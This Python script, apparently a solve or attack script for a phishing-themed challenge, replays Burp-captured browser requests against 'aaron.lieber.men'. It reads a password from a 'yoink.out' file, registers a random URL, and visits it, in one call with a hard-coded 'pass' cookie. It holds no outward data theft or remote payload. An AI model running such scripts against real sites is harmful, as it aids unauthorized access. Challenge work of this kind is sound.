import requests

password_file = open("yoink.out")

password = password_file.readline().rstrip()
print("password is: ", password)


def generateURL(url):
    burp0_url = "https://aaron.lieber.men:443/generate_url"
    burp0_headers = {
        "Sec-Ch-Ua": '"Chromium";v="109", "Not_A Brand";v="99"',
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://aaron.lieber.men",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://aaron.lieber.men/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    burp0_json = {"name": "Justin Stitt", "url": url}
    resp = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    print(resp.content)


def goVisit(url):
    burp0_url = f"https://aaron.lieber.men:443/sus/{url}"
    burp0_headers = {
        "Sec-Ch-Ua": '"Chromium";v="109", "Not_A Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    requests.get(burp0_url, headers=burp0_headers)


def goPhish(url):
    burp0_url = f"https://aaron.lieber.men:443/sus/{url}"
    burp0_cookies = {"pass": "asdasdasdasd"}
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="109", "Not_A Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": f"https://aaron.lieber.men/sus/{url}",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print("====")
    print(resp.content)


from random import sample
from string import ascii_lowercase, ascii_uppercase

_ascii = ascii_lowercase + ascii_uppercase

for _ in range(1):
    rand_url = "".join(sample(_ascii, 32)) + ".com"
    generateURL(rand_url)
    goVisit(rand_url)
    goPhish(rand_url)
